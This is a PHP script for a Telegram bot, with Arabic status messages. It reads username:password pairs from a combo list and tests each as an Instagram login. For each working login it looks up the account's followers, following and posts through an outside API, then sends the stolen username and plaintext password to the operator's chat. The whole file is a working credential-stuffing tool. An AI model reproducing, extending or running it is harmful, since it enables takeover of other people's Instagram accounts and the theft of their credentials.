<?php
$token = json_decode(file_get_contents('admin.json'),true)['info']['token'];
$id = json_decode(file_get_contents('admin.json'),true)['info']['id'];
include 'index.php';
$checked = 0;
$hit = 0;
$bad = 0;
$error = 0;
$edit = bot('sendMessage',[
'chat_id'=>$id,
'text'=>"- يتم الان الفحص الكامل ✅ .",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"• Checked : $checked 🔍",'callback_data'=>'i']],
[['text'=>"• In : $username 🧟‍♂️",'callback_data'=>'i3']],
[['text'=>"• Hits : $hit ✅",'callback_data'=>'i1']],
[['text'=>"• Bad : $bad ❌",'callback_data'=>'i2']],
[['text'=>"• Error : $error ⚠️",'callback_data'=>'i2']],
]
])
]);
$ex = explode("\n",file_get_contents("combo.txt"));
for($i=0;$i<count($ex);$i++){
$info = explode(":",$ex[$i]);
$username = $info[0];
$password = $info[1];
$check = check($username,$password);
if($check == 'true'){
$hit += 1;
$checked += 1;
bot('editMessageReplyMarkup',[
'chat_id'=>$id,
'message_id'=>$edit->result->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"• Checked : $checked 🔍",'callback_data'=>'i']],
[['text'=>"• In : $username 🧟‍♂️",'callback_data'=>'i3']],
[['text'=>"• Hits : $hit ✅",'callback_data'=>'i1']],
[['text'=>"• Bad : $bad ❌",'callback_data'=>'i2']],
[['text'=>"• Error : $error ⚠️",'callback_data'=>'i2']],
]
])
]);
$api = file_get_contents("https://mr-abood.herokuapp.com/Instagram/Info?User=$username");
$followers = json_decode($api,true)['results']['Followers'];
$follwing = json_decode($api,true)['results']['Following'];
$post = json_decode($api,true)['results']['Posts'];
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
👤 - 𝗇𝖾𝗐 𝗁𝗂𝗇𝗍 𝗂𝗇𝗌𝗍𝖺𝗀𝗋𝖺𝗆 .
• — — — — — — — — — • 
• 𝗎𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : $username -
• 𝗉𝖺𝗌𝗌 : $password -
• 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 : $followers -
• 𝖿𝗈𝗅𝗅𝗈𝗐𝗂𝗇𝗀 : $follwing -
•  𝗉𝗈𝗌𝗍 : $post -
• — — — — — — — — — •
📣 - 𝖻𝗒 : @abdtools - @NNPPU .
",
]);
} elseif($check == 'false'){
$bad += 1;
$checked += 1;
bot('editMessageReplyMarkup',[
'chat_id'=>$id,
'message_id'=>$edit->result->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"• Checked : $checked 🔍",'callback_data'=>'i']],
[['text'=>"• In : $username 🧟‍♂️",'callback_data'=>'i3']],
[['text'=>"• Hits : $hit ✅",'callback_data'=>'i1']],
[['text'=>"• Bad : $bad ❌",'callback_data'=>'i2']],
[['text'=>"• Error : $error ⚠️",'callback_data'=>'i2']],
]
])
]);
} else {
$error += 1;
$checked += 1;
bot('editMessageReplyMarkup',[
'chat_id'=>$id,
'message_id'=>$edit->result->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"• Checked : $checked 🔍",'callback_data'=>'i']],
[['text'=>"• In : $username 🧟‍♂️",'callback_data'=>'i3']],
[['text'=>"• Hits : $hit ✅",'callback_data'=>'i1']],
[['text'=>"• Bad : $bad ❌",'callback_data'=>'i2']],
[['text'=>"• Error : $error ⚠️",'callback_data'=>'i2']],
]
])
]);
}
}
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"*
- لقد تم انتهاء الفحص .
*",
]);
